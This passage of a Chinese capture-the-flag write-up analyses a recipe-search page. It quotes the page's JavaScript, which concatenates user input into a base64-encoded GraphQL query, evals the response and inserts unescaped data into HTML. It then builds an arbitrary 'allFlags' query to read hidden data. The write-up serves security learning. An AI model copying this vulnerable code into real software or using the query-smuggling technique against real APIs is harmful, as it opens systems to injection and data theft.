    ```html
        function makeSearch(searchInput) {
            if (searchInput.length == 0) {
                alert("You must provide at least one character!");
                return false;
            }

            // 输入作为 GQL 的参数值，似乎上下文位于 SQL 
            var searchValue = btoa('{ allCooks (filter: { firstname: {like: "%' + searchInput + '%"}}) { nodes { firstname, lastname, speciality, price }}}');
            var bodyForm = new FormData();
            bodyForm.append("search", searchValue);

            // 使用 GET 发送到 `index.php` 端点，参数为 `search`
            fetch("index.php?search=" + searchValue, {
                method: "GET"
            }).then(function(response) {
                response.json().then(function(data) {
                    // 执行：json 转为 js 对象
                    data = eval(data);
                    // 预期查询响应 JSON 结构 data.allCooks.nodes
                    data = data['data']['allCooks']['nodes'];
                    $("#results thead").show()
                    var table = $("#results tbody");
                    table.html("")
                    $("#empty").hide();
                    // 遍历所有节点，预期内容 
                    /// nodes.firstname
                    /// nodes.lastname
                    /// nodes.speciality
                    /// nodes.price
                    data.forEach(function(item, index, array) {
                        table.append("<tr class='table-dark'><td>" + item['firstname'] + " " + item['lastname'] + "</td><td>" + item['speciality'] + "</td><td>" + (item['price'] / 100) + "</td></tr>");
                    });
                    $("#count").html(data.length)
                    $("#count").show()
                });
            });
        }

        $("#clear-btn").click(function() {
            $("#search").val("");
            $("#results tbody").html("");
            $("#results thead").hide();
            $("#count").hide()
            $("#empty").show();
        })

        $("#search-btn").click(function() {
            var content = $('#search').val();
            makeSearch(content);
        })
    </script>
    ```

## 功能探测


测试 GQL 查询
- 使用任意[可视化工具](https://apis.guru/graphql-voyager/)，复制查询结构
    ```http
    GET /index.php?search=[base64 编码后的查询结构] HTTP/1.1
    ```

- 查询格式
```log
// 查询
allFlags(first:Int, last:Int, offset:Int, before:Cursor, after:Cursor, orderBy:null, condition:FlagCondition, filter:FlagFilter): FlagsConnection
```


- 格式化对象
    ```log
    // 对象
    FlagsConnection {
        nodes: [Flag]! 
        edges: [FlagsEdge!]! 
        pageInfo: PageInfo! 
        totalCount: Int!
    }

    Flag {
        nodeId: ID! 
        id: Int! 
        flag: String
    }

    FlagsEdge {
        cursor: Cursor 
        node: Flag
    }

    PageInfo {
        hasNextPage: Boolean! 
        hasPreviousPage: Boolean! 
        startCursor: Cursor 
        endCursor: Cursor
    }
    ```

- 演化构造查询
    ```graphql
    query myQueryFlags {
        allFlags: FlagsConnection
    }
    ```

    ```graphql
    query myQueryFlags {
        allFlags {
            nodes {
                nodeId 
                id 
                flag
            }
        }
    }
    ```
